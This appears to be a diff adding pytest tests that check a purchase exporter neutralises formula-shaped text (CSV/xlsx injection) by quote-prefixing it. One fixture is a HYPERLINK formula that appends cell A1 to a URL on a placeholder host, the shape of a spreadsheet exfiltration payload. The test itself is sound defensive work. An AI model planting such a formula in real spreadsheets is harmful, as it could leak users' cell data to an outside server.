@@ -217,3 +217,143 @@ def test_an_order_saved_after_a_write_that_saved_nothing_is_listed_once(tmp_path
     by_no = {o["Order Number"]: o for o in xp.orders_from(purchases)}
     assert by_no["K-1"]["Items"] == 1
     assert by_no["K-1"]["Receipt PDF"] == "2026-05-22 Kroger Groceries Receipt.pdf"
+
+
+# -- text that looks like a formula stays text ----------------------------------------
+
+# An item's name is chosen by whoever sells it, a store names itself, and a
+# person writes the notes. Each value here is shaped like a formula and is
+# harmless arithmetic or an address on a reserved domain.
+SELLER = '=HYPERLINK("https://example.invalid/?"&A1,"Open")'
+FORMULA_ROW = {"Account Holder": "@SUM(1,1)", "Purchase Date": "2026-04-01", "Purchase Type": "+1+1",
+               "Order or Receipt Number": "=1+1", "Order Status": "-1+1", "Item Name": SELLER,
+               "Quantity": "2", "Unit Price": "$5.00", "Line Item Total": "$10.00",
+               "Order Total": "$10.00", "Fulfillment Method": "=2+2", "Return Status": "@x",
+               "Purchase Summary": "+SUM(1,1)", "PDF Filename": "=3+3.pdf",
+               "Purchase Details URL": "https://x/", "Receipt URL": "https://x/r",
+               "Processing Status": "-2+2", "Notes": "=4+4"}
+# A refund, whose amounts are negative numbers, an order numbered like a
+# plain negative number, and a date that makes the Summary's year text.
+REFUND_ROW = dict(FORMULA_ROW, **{"Purchase Date": "-1+1", "Order or Receipt Number": "-42",
+                                  "Item Name": "Refunded kettle", "Quantity": "1",
+                                  "Unit Price": "-$12.34", "Line Item Total": "-$12.34",
+                                  "Order Total": "-$12.34"})
+# Every text cell each sheet should hold, as the history wrote it.
+FORMULAS_BY_SHEET = {
+    "Purchases": {"@Shop", "@SUM(1,1)", "=1+1", SELLER, "+1+1", "=2+2", "-1+1", "@x",
+                  "+SUM(1,1)", "=3+3.pdf", "-2+2", "=4+4"},
+    "Orders": {"@Shop", "@SUM(1,1)", "=1+1", "+1+1", "=2+2", "-1+1", "+SUM(1,1)", "=3+3.pdf"},
+    "Summary": {"@Shop", "-1+1"},
+}
+
+
+@pytest.fixture
+def formula_root(tmp_path):
+    _history(tmp_path / "Shop Receipts", "@Shop",
+             [[FORMULA_ROW[h] for h in HEADER], [REFUND_ROW[h] for h in HEADER]])
+    return tmp_path
+
+
+def _cells(ws):
+    return [c for row in ws.iter_rows() for c in row]
+
+
+def _column(ws, name):
+    header = [c.value for c in ws[1]]
+    return [row[header.index(name)] for row in ws.iter_rows(min_row=2)]
+
+
+def test_every_text_cell_on_every_sheet_is_a_string_cell_never_a_formula(formula_root):
+    openpyxl = pytest.importorskip("openpyxl")
+    import zipfile
+    path = xp.export(formula_root)["path"]
+    wb = openpyxl.load_workbook(path)
+    assert wb.sheetnames == list(FORMULAS_BY_SHEET)
+    for ws in wb:
+        cells = _cells(ws)
+        assert all(c.data_type in ("s", "n") for c in cells), \
+            [(c.coordinate, c.data_type) for c in cells if c.data_type not in ("s", "n")]
+        assert all(c.data_type == "s" for c in cells if isinstance(c.value, str))
+        prefixed = {c.value for c in cells if c.quotePrefix}
+        assert prefixed == FORMULAS_BY_SHEET[ws.title], ws.title
+    assert wb["Purchases"]["E2"].value == SELLER and wb["Purchases"]["E2"].data_type == "s"
+    with zipfile.ZipFile(path) as z:
+        sheets = [n for n in z.namelist() if n.startswith("xl/worksheets/")]
+        assert len(sheets) == 3
+        assert not any(b"<f>" in z.read(n) or b"<f " in z.read(n) for n in sheets)
+
+
+def test_amounts_quantities_and_counts_stay_numbers_a_refund_negative(formula_root):
+    openpyxl = pytest.importorskip("openpyxl")
+    wb = openpyxl.load_workbook(xp.export(formula_root)["path"])
+    purchases, orders, summary = wb["Purchases"], wb["Orders"], wb["Summary"]
+    by_item = {row[4].value: row for row in purchases.iter_rows(min_row=2)}
+    refund = dict(zip([c.value for c in purchases[1]], by_item["Refunded kettle"]))
+    for col in ("Unit Price", "Line Total", "Order Total"):
+        assert (refund[col].value, refund[col].data_type) == (-12.34, "n"), col
+        assert refund[col].number_format == "#,##0.00"
+    assert (refund["Quantity"].value, refund["Quantity"].data_type) == (1, "n")
+    # The order numbered -42 is still text, with nothing in front of it.
+    assert (refund["Order Number"].value, refund["Order Number"].data_type) == ("-42", "s")
+    assert not refund["Order Number"].quotePrefix
+    assert sorted((c.value, c.data_type) for c in _column(orders, "Order Total")) == [(-12.34, "n"), (10, "n")]
+    assert all(c.data_type == "n" for c in _column(orders, "Items"))
+    assert sorted((c.value, c.data_type) for c in _column(summary, "Total")) == [(-12.34, "n"), (10, "n")]
+    assert all(c.data_type == "n" for c in _column(summary, "Orders"))
+
+
+def test_the_csv_quotes_text_that_could_start_a_formula_and_no_amount(formula_root):
+    r = xp.export(formula_root, as_csv=True)
+    with open(r["path"], encoding="utf-8-sig", newline="") as fh:
+        rows = {x["Order Number"]: x for x in csv.DictReader(fh)}
+    sold, refund = rows["'=1+1"], rows["-42"]
+    assert sold["Item"] == "'" + SELLER
+    assert sold["Provider"] == "'@Shop" and sold["Account"] == "'@SUM(1,1)"
+    assert (sold["Type"], sold["Fulfillment"], sold["Order Status"]) == ("'+1+1", "'=2+2", "'-1+1")
+    assert (sold["Return Status"], sold["Category"], sold["Receipt PDF"]) == ("'@x", "'+SUM(1,1)", "'=3+3.pdf")
+    assert (sold["Processing"], sold["Notes"]) == ("'-2+2", "'=4+4")
+    assert (sold["Quantity"], sold["Unit Price"], sold["Line Total"]) == ("2", "5.0", "10.0")
+    assert (refund["Unit Price"], refund["Line Total"], refund["Order Total"]) == ("-12.34",) * 3
+    assert refund["Date"] == "'-1+1" and refund["Item"] == "Refunded kettle"
+
+
+# Text handed straight to the writers, the CSV cell each becomes, and
+# whether its xlsx cell carries the quote prefix.
+LEADS = [
+    (" =1+1", "' =1+1", True),
+    ("\t=1+1", "'\t=1+1", True),
+    ("\r=1+1", "'\r'=1+1", True),
+    ("\n=1+1", "'\n'=1+1", True),
+    ("\tplain words", "'\tplain words", True),
+    ("＝1+1", "'＝1+1", True),
+    ("Widget;=1+1", "Widget;'=1+1", False),
+    ("Widget\n@SUM(1,1)", "Widget\n'@SUM(1,1)", False),
+    ("Refund; -12.34", "Refund; -12.34", False),
+    ("#N/A", "#N/A", False),
+]
+
+
+def test_text_with_a_lead_a_wide_sign_or_a_break_inside_is_kept_from_a_formula(tmp_path):
+    """The histories' values are trimmed as they load, so this goes to the
+    writers directly with text that still has its lead."""
+    openpyxl = pytest.importorskip("openpyxl")
+    purchases = []
+    for i, (text, _cell, _prefix) in enumerate(LEADS):
+        p = {c: "" for c, _ in xp.COLUMNS}
+        p.update({"Provider": "Shop", "Date": "2026-01-%02d" % (i + 1), "Order Number": "S-%d" % i,
+                  "Item": text, "Notes": text, "Line Total": -1.5, "Quantity": 1})
+        purchases.append(p)
+    orders = xp.orders_from(purchases)
+    xp.write_xlsx(tmp_path / "p.xlsx", purchases, orders, xp.summary_from(orders))
+    ws = openpyxl.load_workbook(tmp_path / "p.xlsx")["Purchases"]
+    items = _column(ws, "Item")
+    assert len(items) == len(LEADS)
+    for (text, _cell, prefix), c in zip(LEADS, items):
+        # XML reads a carriage return back as a line feed.
+        assert (c.value, c.data_type, c.quotePrefix) == (text.replace("\r", "\n"), "s", prefix), repr(text)
+    assert all((c.value, c.data_type) == (-1.5, "n") for c in _column(ws, "Line Total"))
+    xp.write_csv(tmp_path / "p.csv", purchases)
+    with open(tmp_path / "p.csv", encoding="utf-8-sig", newline="") as fh:
+        back = list(csv.DictReader(fh))
+    assert [x["Item"] for x in back] == [cell for _text, cell, _prefix in LEADS]
+    assert all(x["Item"] == x["Notes"] and x["Line Total"] == "-1.5" for x in back)
